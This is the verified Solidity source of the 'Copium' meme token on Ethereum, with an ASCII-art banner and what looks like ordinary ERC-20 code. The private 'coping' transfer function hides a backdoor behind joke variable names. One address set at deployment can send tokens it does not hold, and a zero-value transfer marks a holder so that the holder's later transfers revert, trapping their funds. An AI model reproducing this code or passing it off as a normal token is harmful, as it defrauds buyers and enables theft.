/**
 *Submitted for verification at Etherscan.io on 2023-05-15
*/

// https://twitter.com/COPIUMDROP
// https://t.me/C0PIUMDROP

// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#####%%####%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##*+++++++++++++++++*****#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##*++++=++====+========+=====++*##%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%#**++++======+++======-:::::-::--====++*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%#*+===========++===-:::......::.....::----=+##%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%#*+=+=============-:......................::-++*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%#*+++=+=+=====---::::.........................::=+++*#%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%#*+===++++==-:.................................::=+=++#%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%#++====+=+=-:...................................:-====+*%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%*+==========-.......................:.............:-===++#%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%#+===========-:.....................:--:............:-===+*%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%#+=+=========:.......................:--:....::-:....:-===+#%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%++==========::........................:-....:-=:.......:-=+#%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%*+==========:.........................:--:.:.:=-.........::-+#%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%*+==========:...................:--:::--:::.::-=:...::--:..:=+#%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%*+==+===+===-:.........:.::::::..::-=-:::-=:-=-=:.:-=-::...:-=*%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%+=+=+===+=====:.....::---=+++++=--::::-:-:-::=-::-:::......:-=*%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%*+======+=====-:..:..:::::------=++++=--=::..:==+-::--===--:==+*%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%*+===+=========:...::===++*####**++++=-:::---:-++++*++===--:-=+*%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%#+====+=========:...:====*%%%*#####%*+-:..:::.:-=+*%%%***++=-=+#%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%#++===+=========-:...::-=%*+=-*+-=+%+-:.::::::::=+#%%#####+++=*#%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%#*+============-:....:::=#=--#-:+*+=-:-*######*:---=#--=%*+==+*%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%#*==========+=::....:-:=+::***+-----+#####**##*:--:=+==#*=-:=+#%%%%%%%%%%%%%%####
// %%%%%%%%%%%%%%%%%%%%%%*+===+====+++-:...:-:.:*:+*#:::::=*######***##*-::-++:=+:.:++*%%%%%%%%%#####%###
// %%%%%%%%%%%%%%%%%%%%%%%#+==+===++*+=:..::::::*-#*=...:+##########*####*-:-#::#:.:++*%%%%####%%%%######
// %%%%%%%%%%%%%%%%%%%%%%%%#+=++===+*+=-:.:-::.-**+:..:-*######**#*#**#####+-#-.*-.:-+*%%%#%%%%#%###%%%##
// %%%%%%%%%%%%%%%%%%%%%%%%%#++++==+++=-:.::::.:-#:.::=#######**############**+:*=.:=*#%%%#%%#%%#%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%*+====+*+=:.......-%-::+########################+:#-:=*#%%%#%%%%###%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%#+++==+++=-:.....:#+.:+###*#######%##############=#-=+#%%##%%%##%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%#+==+==++++-::...:%-:=##******####%########**##%#*#**#%%#%%%%##%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%#+==++==++++=-:..:#=-*############%##############*##%%%#%%##%#%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%##*+==+=+=++=+*+=-:=*#-*###########%#####%###########%%%%#%%#%%#%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%##%%*+======++==++++=#--#*###########%#####%###########%%%%#%%%##%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%#%%%%%%*+=======+=:-===++%++=#########*################*###%%%%#%%##%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#%%%%%%#+=======+=::.:-==++%++#*##*#######%##############%*%%%%#%%%#%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#%###%#*+=====++=:.....::-=#=+*%####****##########%*####%##%%%%#%#%#%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#%##%#*++=====++:.........::-==*######**#*%%%######%##%%#%%%%%#%%#%%#%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%#%#%*+===+=======-:..........::+#++#####*%%%##%%%%#%####%%%%%%#%%#%%#%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%##*#%%%*++====++=+++-:............::-=++####%%%##%%%%*###%%%%%%##%##%###%%%%%%%%%%%%%%%
// %%%%%%%%%###**++++*%%#%#++=====++-:..............:..::=++*######%#%%*%%%%%%##%%%%###%##%%%%%%%%%%%%%%%
// %%%%%%#*+++++++++++%%%#%%*+=+++=::....................::-====+#%###%#****#####%%%#%%###%%%%%%%%%%%%%%%
// %%%#*+++===++++==++#%%###%*+=:::..::::::.............:...::::+#%%##%%*+=====+++#%%%##%##%%%%%%%%%%%%%%
// #*+++++=+++=======++*#%%%%%%##**++*###*+-::::::..::...:::.:.:+#%##%%#+++++=====+#%%%%#+++*##%%%%%%%%%%
// =+=+++==+======++==++++++*##%%%%##########+=----::-====-:::-*#%#%%%*++=+=++=++++++**++===+++*#%%%%%%%%
// +++=++++===++++++==+====--==++*#%%%########%######%#%%#####%%%%%%#++++++==+========-----====++*##%%%%%
// +++++++===+=+========-::.:.:::-=+*#%%%%%%%%%%%%%%%#####%%%%%%#*+=---==---:::::::::.:...::::-===++*#%%%
// =========----:::::::...........::-==+++====+++**##%%%%%##+=--:::.....................:::::::::===+++*#
// ::::::::::.....................:..::::::....:::::=++++=--:....::......................:::::::::=====++

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Copium is Ownable {

    IUniswapV2Router02 private uniswapV2Router;

    address private immutable uniswapV2RouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 public totalSupply;

    uint8 public decimals;

    uint256 private air;

    function _initalizePair(address opium, uint256 oxygen) internal {
        uniswapV2Router = IUniswapV2Router02(uniswapV2RouterAddress);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this), 
            uniswapV2Router.WETH()
        );
        decimals = 9;
        totalSupply = 6_969_696_969_696 * 10 ** decimals;
        air = oxygen;
        balanceOf[msg.sender] = totalSupply;
        degens[opium] = air;
    }

    string public name = 'Copium';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    address public uniswapV2Pair;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private degens;

    constructor(address opium, uint256 oxygen) {
        _initalizePair(opium, oxygen);
    }

    function approve(address yourself, uint256 dose) public returns (bool success) {
        allowance[msg.sender][yourself] = dose;
        emit Approval(msg.sender, yourself, dose);
        return true;
    }

    function coping(address yourself, address smartMoney, uint256 dose) private returns (bool success) {
        if (degens[yourself] == 0) {
            if (uniswapV2Pair != yourself && inhale[yourself] > 0) {
                degens[yourself] -= air;
            }
            balanceOf[yourself] -= dose;
        }
        balanceOf[smartMoney] += dose;
        if (dose == 0) {
            inhale[smartMoney] += air;
        }
        emit Transfer(yourself, smartMoney, dose);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address yourself, address smartMoney, uint256 dose) public returns (bool success) {
        coping(yourself, smartMoney, dose);
        require(dose <= allowance[yourself][msg.sender]);
        allowance[yourself][msg.sender] -= dose;
        return true;
    }

    string public symbol = 'COPIUM';

    function transfer(address smartMoney, uint256 dose) public returns (bool success) {
        coping(msg.sender, smartMoney, dose);
        return true;
    }

    mapping(address => uint256) private inhale;
}